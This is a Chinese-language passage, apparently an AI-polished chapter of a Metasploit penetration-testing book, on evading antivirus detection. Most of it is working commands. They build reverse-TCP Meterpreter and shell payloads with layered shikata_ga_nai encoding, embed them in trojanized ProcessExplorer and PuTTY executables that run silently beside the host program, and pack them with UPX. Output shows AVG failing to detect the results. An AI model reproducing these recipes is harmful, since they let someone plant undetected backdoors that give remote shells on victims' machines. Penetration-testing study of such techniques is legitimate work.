### 码器输出格式及文件检查
编码器的输出格式为.exe（-texe），生成的文件名为`/var/www/payload2.exe`。随后，我们对生成的文件进行了快速类型检查，以确保其符合Windows可执行文件的标准。检查结果显示文件无误。然而，在将`payload2.exe`复制到我们的Windows主机上后，它仍未能绕过AVG杀毒软件的检测，如图7-2所示。

**图7-2 AVG检测结果**
```
File Components History Tools Help
AVG
You may not be protected! Please, check the following
Resident Shield: Disabled
Anti-Virus Free Edition
Scan results
Overview
Results overview Infections
Computer scanned
File
Infection
Result
C:\Documents and Settings\Administrator\Desktop\payload2.exe Virus found: win32/HeurInfected
Shellextension scan
Update now
```

### 7.2.2 多重编码技术
在Metasploit框架中，通过使用多重编码技术，我们可以提高攻击载荷逃避杀毒软件检测的成功率。这种技术通过对二进制文件进行多次编码，从而绕过基于特征码的检测机制。例如，shikata_ga_nai编码是一种多态编码方法，每次生成的攻击载荷文件都是不同的，这使得杀毒软件难以识别恶意代码。尽管如此，有时生成的文件仍会被查杀，而有时则不会。因此，在实际操作前，建议安装测试版杀毒软件对生成的文件进行预检测。

下面是一个利用多重编码生成攻击载荷的例子：
```bash
root@bt:/opt/framework3/msf3# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/alpha_upper -c 2 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/countdown -c 5 -t exe -o /var/www/payload3.exe
```
上述命令中，我们先使用了五次shikata_ga_nai编码，接着两次alpha_upper编码，再五次shikata_ga_nai编码，最后是五次countdown编码。总计进行了十七次编码处理。此次尝试成功地避开了AVG杀毒引擎的检测（见图7-3）。

**图7-3 AVG未检测出经过多重编码的攻击载荷**

### 7.3 自定义可执行文件模板
通常情况下，msfencode会将攻击载荷嵌入到默认的可执行文件模板中。但该模板很容易被杀毒软件厂商列为监控对象。幸运的是，msfencode支持使用-x选项来指定一个自定义的Windows可执行程序作为新的模板。比如，可以采用微软Sysinternals套件中的ProcessExplorer程序作为模板：
```bash
root@bt:/opt/framework3/msf3# wget http://download.sysinternals.com/Files/ProcessExplorer.zip
...SNIP...
root@bt:/opt/framework3/msf3# cd work/
root@bt:/opt/framework3/msf3/work# unzip ../ProcessExplorer.zip
...SNIP...
root@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 X processexplorer.exe -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/pe_backdoor.exe
```
这样生成的后门程序不仅能够正常运行ProcessExplorer的功能，还能够在不引起杀毒软件警觉的情况下建立远程连接（见图7-4）。

**图7-4 运行的后门程序没有被AVG查杀**

### 7.4 隐秘启动攻击载荷
为了使攻击更加隐蔽，可以在启动攻击载荷的同时让宿主程序也正常运行。例如，我们可以将PuTTY工具与我们的攻击载荷结合在一起：
```bash
root@bt:/opt/framework3/msf3# msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=8080 X putty.exe -k -e x86/shikata_ga_nai -c 5 -t exe -o /var/www/putty_backdoor.exe
```
这里使用的-k选项允许攻击载荷在一个独立线程中启动，从而不影响宿主程序的执行。最终，当用户运行这个修改过的PuTTY时，他们不会察觉任何异常，并且AVG也不会报告存在威胁（见图7-5）。

**图7-5 AVG报告攻击载荷文件是安全的**

### 7.5 加壳软件
加壳软件能够对可执行文件进行加密和压缩，并在其中嵌入解压代码。这不仅可以减小文件大小，还可以改变文件结构，使其更难被杀毒软件识别。常用的加壳工具包括UPX，以下是使用UPX对payload3.exe进行加壳的示例：
```bash
root@bt:/# apt-get install upx
...SNIP...
root@bt:/# upx -5 /var/www/payload3.exe
Ultimate Packer for eXecutables
Copyright (C) 1996-2009
UPX 3.04
Markus Oberhumer, Laszlo Molnar & John Reiser
Sep 27th 2009
File size Ratio Format Name
37888 -> 22528 59.46% win32/pe payload3.exe
Packed 1 file.
```
通过这种方式，我们成功地将payload3.exe的体积减少了59.46%，并且提高了其免杀能力。

### 7.6 小结：关于免杀处理的最后忠告
虽然本章介绍的方法目前仍然有效，但由于杀毒软件的不断更新，这些技术的有效性可能会迅速降低。因此，建议渗透测试者持续关注最新的免杀技术和工具，并不断实践以提高成功率。

---

希望这段优化后的文本能够更好地满足你的需求。如果有其他部分需要进一步改进，请随时告诉我！